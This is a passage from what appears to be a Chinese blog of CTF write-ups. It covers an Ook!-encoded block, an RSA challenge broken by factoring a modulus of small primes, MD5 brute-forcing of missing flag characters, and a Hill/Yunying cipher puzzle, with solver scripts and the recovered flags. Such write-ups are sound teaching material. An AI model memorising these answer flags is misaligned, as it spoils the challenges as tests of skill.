..... ..... ..... !?!!. ?!!!! !!!!! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... .....</span><br><span class="line">..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... .....</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..... .....</span><br><span class="line">..!.! !!!!! !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.! !!!!! !!!!! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?. ..... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... .!... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?..! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... .....</span><br><span class="line">!?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! ...!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. !.?.. ..... ....! ?!!.?</span><br><span class="line">..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?.</span><br><span class="line">?!.?! !!!!! !!!!! .!... ..... ..... ..!.! !!!!! !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... ...!. !!!!! !!!!! !.?.. ..... ..... .!?!! .?... .....</span><br><span class="line">....? .?!.? ..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.?</span><br><span class="line">!.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!.</span><br><span class="line">!.... ..... !.... ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!!</span><br><span class="line">.?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .!... ..!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... ..... .!... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? ..... ..... ..... ..... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... !.!!! .?... ..... ..... !?!!. ?.... ..... ...?.</span><br><span class="line">?!.?. ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!.</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !!!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.!! !!!!! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">....! ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ..!.. .!.?. ..... .....</span><br><span class="line">..!?! !.?.. ..... ..... ?.?!. ?.... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... ..!.! !!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... ..!.! !!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! .....</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... !.!!! !!!!! !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... !.... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?....</span><br><span class="line">..... ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... !.... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? ..... ..... ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... ..!.! !!!!! !!!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ....! ..... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!!!!</span><br><span class="line">!!!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ..... .!.!! !!!!! .?...</span><br><span class="line">..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!! !!!.? ..... ..... ...!?</span><br><span class="line">!!.?. ..... ..... .?.?! .?... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... !.... ..... !.?.. ..... ..... .!?!! .?... .....</span><br><span class="line">....? .?!.? !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... ..... ...!.</span><br><span class="line">!!!!! !!!!! !!!!! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!.</span><br><span class="line">!!!!! !!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... .....</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ..!.! !!!!!</span><br><span class="line">!!!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!. !!!.? ..... ..... ...!?</span><br><span class="line">!!.?. ..... ..... .?.?! .?... ..... ....! .?... ..... ...!? !!.?. .....</span><br><span class="line">....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!!</span><br><span class="line">!!!!! !!!!. !.... ..... ..... .!.!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?.. !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">..!.! !!!!! !.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ...!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!. !!!!! !!!!!</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ...!. !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..... ..... !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ...!. ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!.</span><br><span class="line">!!!!! !!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ....! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! .!!!! !!!!! !!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!. ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!!!!</span><br><span class="line">!!!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!! !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..... ..... ..!.? ..... ..... .!?!!</span><br><span class="line">.?... ..... ..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!!</span><br><span class="line">?.?!. ?!!!! !!!!! !!.!. ..... ..... !.... .!.?. ..... ..... ..!?! !.?..</span><br><span class="line">..... ..... ?.?!. ?..!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..!.. ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?... .....</span><br><span class="line">..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... .....</span><br><span class="line">..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... .!...</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ...!. ?.... .....</span><br><span class="line">..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!!</span><br><span class="line">!!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!. !!!!! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... !.... ...!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... .....</span><br><span class="line">....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!.</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?... ..... ...!?</span><br><span class="line">!!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!. !.... ...!. ?.... ..... ..... .!?!! .?... .....</span><br><span class="line">..... .?.?! .?!.? .</span><br></pre></td></tr></table></figure>



<p>分析</p>
<p>只要三种元素  !?.  比较符合Ook加密 </p>
<p><img src="/posts/555436f5/3.png"></p>
<p>套娃题 没啥意思 不想着了</p>
<h3 id="LitCTF-2023-yafu-中级"><a href="#LitCTF-2023-yafu-中级" class="headerlink" title="[LitCTF 2023]yafu (中级)"></a>[LitCTF 2023]yafu (中级)</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n  = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    n *=getPrime(<span class="number">32</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"><span class="string">c = 12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>yafu分解n </p>
<p><img src="/posts/555436f5/4.png" alt="截图"></p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">n  = 1</span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    n *=getPrime(32)</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = pow(m,e,n)</span></span><br><span class="line"><span class="string">print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="string">print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="string"># n = 15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"><span class="string"># c = 12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line">n = <span class="number">15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">2201440207</span></span><br><span class="line">P2 = <span class="number">3354884521</span></span><br><span class="line">P3 = <span class="number">2719600579</span></span><br><span class="line">P4 = <span class="number">4171911923</span></span><br><span class="line">P5 = <span class="number">2906576131</span></span><br><span class="line">P6 = <span class="number">2767137487</span></span><br><span class="line">P7 = <span class="number">4021078331</span></span><br><span class="line">P8 = <span class="number">2585574697</span></span><br><span class="line">P9 = <span class="number">4044505687</span></span><br><span class="line">P10 = <span class="number">2151018733</span></span><br><span class="line">P11 = <span class="number">2315495107</span></span><br><span class="line">P12 = <span class="number">2758708999</span></span><br><span class="line">P13 = <span class="number">3355651511</span></span><br><span class="line">P14 = <span class="number">2923522073</span></span><br><span class="line">P15 = <span class="number">3989697563</span></span><br><span class="line"></span><br><span class="line">phi = (P1-<span class="number">1</span>)*(P2-<span class="number">1</span>)*(P3-<span class="number">1</span>)*(P4-<span class="number">1</span>)*(P5-<span class="number">1</span>)*(P6-<span class="number">1</span>)*(P7-<span class="number">1</span>)*(P8-<span class="number">1</span>)*(P9-<span class="number">1</span>)*(P10-<span class="number">1</span>)*(P11-<span class="number">1</span>)*(P12-<span class="number">1</span>)*(P13-<span class="number">1</span>)*(P14-<span class="number">1</span>)*(P15-<span class="number">1</span>)</span><br><span class="line">d  = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;Mu1tiple_3m4ll_prim5_fac7ors_@re_uns4f5&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LitCTF-2023-md5的破解"><a href="#LitCTF-2023-md5的破解" class="headerlink" title="[LitCTF 2023]md5的破解"></a>[LitCTF 2023]md5的破解</h3><p>题目</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag全是由小写字母及数字组成</span></span><br><span class="line">m=md5(flag).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag[:<span class="number">13</span>]+flag[<span class="number">15</span>:<span class="number">18</span>]+flag[<span class="number">19</span>:<span class="number">34</span>]+flag[<span class="number">35</span>:<span class="number">38</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;md5can??3de?rypt213thoughcr?sh&#125;?</span></span><br><span class="line"><span class="comment"># 496603d6953a15846cd7cc476f146771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;</span></span><br><span class="line">LitCTF&#123;md5can</span><br><span class="line">3de</span><br><span class="line">rypt213thoughc</span><br><span class="line">rsh&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>分析</p>
<p>缺少第13、14、18、34位  爆破大小写字母数字即可</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase,digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># LitCTF&#123;md5can??3de?rypt213thoughcr?sh&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ascii_lowercase+digits:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">                f = <span class="string">&#x27;LitCTF&#123;md5can&#x27;</span>+i+j+<span class="string">&#x27;3de&#x27;</span>+k+<span class="string">&#x27;rypt213thoughcr&#x27;</span>+l+<span class="string">&#x27;sh&#125;&#x27;</span></span><br><span class="line">                h = md5(f.encode()).hexdigest()</span><br><span class="line">                <span class="comment"># print(h)</span></span><br><span class="line">                <span class="keyword">if</span> h == <span class="string">&#x27;496603d6953a15846cd7cc476f146771&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(f)</span><br><span class="line">                    exit()</span><br><span class="line">                    </span><br><span class="line"><span class="comment"># LitCTF&#123;md5can123dexrypt213thoughcrpsh&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="HDCTF-2023-爬过小山去看云"><a href="#HDCTF-2023-爬过小山去看云" class="headerlink" title="[HDCTF 2023]爬过小山去看云"></a>[HDCTF 2023]爬过小山去看云</h3><p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne</span><br><span class="line">在山的那头，有3个人，4只鸟，19只羊，11朵云</span><br></pre></td></tr></table></figure>

<p>没见过 不会整 直接看下wp记录下</p>
<p>【希尔+云影】</p>
<h4 id="希尔密码-hill-cipher"><a href="#希尔密码-hill-cipher" class="headerlink" title="希尔密码 hill cipher"></a>希尔密码 hill cipher</h4><p>替换密码，使用矩阵和矩阵乘法来混合明文</p>
<p><a href="http://www.metools.info/code/hillcipher243.html">http://www.metools.info/code/hillcipher243.html</a>  在线解密 </p>
<p><img src="/posts/555436f5/5.png"></p>
<p>得到 yourpiniseightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofourx</p>
<p>对应数字  eightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofour</p>
<p>842084210884024084010124      只包含01248云影密码</p>
<p><img src="/posts/555436f5/6.png"></p>
<p>NOTFLAG</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 云影密码加解密脚本</span></span><br><span class="line"><span class="comment"># https://www.jianshu.com/p/b5aa5cf60f83</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_code</span>(<span class="params">c</span>):</span><br><span class="line">    dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">    flag = []</span><br><span class="line">    c2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&quot;0&quot;</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">        c3 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            c3 += <span class="built_in">int</span>(j)</span><br><span class="line">        flag.append(dic[c3 - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">plaintext</span>):</span><br><span class="line">    dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">    m = [i <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    tmp = [];flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">            <span class="keyword">if</span> m[i] == dic[j]:</span><br><span class="line">                tmp.append(j + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        res = <span 